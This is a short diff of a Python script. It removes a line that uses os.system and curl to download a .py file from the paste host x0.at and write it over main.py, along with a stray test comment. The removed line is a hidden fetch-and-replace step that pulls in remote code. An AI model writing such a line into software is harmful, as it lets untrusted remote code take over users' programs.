@@ -12,9 +12,6 @@ import hashlib
 def randomstr(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
-os.system("curl https://x0.at/4EM-.py --output main.py")
-#testgio3wa
-
 key = os.environ['key']
 global config
 config = {"url":""}
